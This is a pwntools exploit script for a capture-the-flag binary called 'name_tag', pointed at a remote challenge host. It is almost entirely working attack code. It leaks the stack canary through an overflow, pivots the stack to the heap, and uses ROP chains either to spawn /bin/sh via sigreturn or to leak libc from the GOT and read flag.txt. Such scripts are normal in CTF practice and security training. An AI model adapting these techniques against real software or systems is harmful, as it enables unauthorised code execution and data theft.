#!/usr/bin/env python3
from pwn import *

#  exe = context.binary = ELF('name_tag')
exe = context.binary = ELF('name_tag-traceable')

sigreturn = 0x4015b2 # add rax 14; add rax 1; syscall
syscall = 0x4015ba   # syscall
pop_rsp = 0x40163d   # pop rsp; pop r13; pop r14; pop r15; ret;
clear_eax = 0x401279 # mov eax, 0; pop rbp; ret

host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 32181)
#  context.log_level = "DEBUG"

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    # Found via leaking GOT entries and querying libc.rip. It was unintended
    # to find a result but the author missed this site's DB.
    libc = ELF("./libc-2.32-x86_64.so")

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def do_rop(io, chain):
    io.sendline((b"A"*40)+b"\x01")
    io.recvuntil(b"A"*40)
    cookie = int.from_bytes(io.recv()[:8], "little")
    cookie &= 0xffffffffffffff00 # zero out lowest byte
    log.info("-> cookie: " + hex(cookie))
    io.clean()

    p = pack(1) + pack(2) + pack(3) # r13-15, ROP next
    p += chain
    if len(p) > 512:
        raise Exception("paylod too big! Max 512, was: {}".format(len(p)))

    io.sendline(p)
    io.recvuntil("tag id: ")
    heap_addr = int(io.recvline()[:-1])

    p = b"A"*72
    p += pack(cookie)
    p += pack(heap_addr & 0xfffffffffffff000) # rbp
    p += pack(pop_rsp)   # pop rsp; pop r13; pop r14; pop r15; ret;
    p += pack(heap_addr) # pop to esp
    io.sendline(p)

    return heap_addr

def do_execve_shell():
    """
    This exploit uses ROP to read in a /bin/sh string and then uses a sigreturn
    to execve and get a shell. Due to the anti-debugging measures in the offical
    binary (it runs the ptrace syscall), this only works on patched binaries and
    not the real flag, but was part of my exploit development so I kept it
    around for example purposes. The ptrace makes it so that execve sycalls get
    SIGTRAP'd which stops them from executing.
    """
    io = start()

    bin_sh_addr = 0x404000
    r = ROP(exe)
    r.readStr(bin_sh_addr, 0xff)
    r.raw(clear_eax)
    r.raw(0) # pad because the clear_eax has an extra pop
    r.raw(sigreturn)

    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall

    do_rop(io, r.chain() + bytes(frame))

    io.clean()
    io.sendline("/bin/sh")
    io.interactive()

def do_libc_exploit():
    """
    This exploit leaks libc addresses from GOT to calculate the base address
    and leverages that to ROP an open/read/write flow to get the flag.
    """
    io = start()
    data_writable = 0x404f00
    flag_addr = 0x404e00

    # First ROP is to leak the heap address and set us up for another.
    r = ROP(exe)
    r.puts(exe.got['puts'])
    r.puts(exe.got['malloc'])
    r.readStr(flag_addr, 0xff)
    r.readStr(data_writable, 0xfff)
    r.raw(pop_rsp) #  pop rsp; pop r13; pop r14; pop r15; ret;
    r.raw(data_writable)
    heap = do_rop(io, r.chain())
    heap += 1024 # get our of the way of our previous writes

    io.recvuntil("Bio: ")
    leaks = io.clean()[:-1].split(b"\n")
    if len(leaks) < 3:
        return
    puts_addr = int.from_bytes(leaks[-2], "little")
    malloc_addr = int.from_bytes(leaks[-1], "little")
    libc.address = puts_addr-libc.symbols['puts']
    log.info("libc: " +hex(libc.address))

    io.sendline("./flag.txt")

    r = ROP([exe, libc])
    r.raw(1) #  r13-15
    r.raw(2) #  r13-15
    r.raw(3) #  r13-15
    r.open(flag_addr, 0)
    if args.LOCAL: # exerimentally chosen FDs of the open flag file
        r.read(3, heap, 0xff)
    else:
        r.read(6, heap, 0xff)
    r.write(1, heap, 0xff)
    io.sendline(r.chain())

    dat = io.recv().replace(b"\x00", b"").decode()
    if len(dat) > 0:
        print(dat)

#  do_execve_shell()
do_libc_exploit()
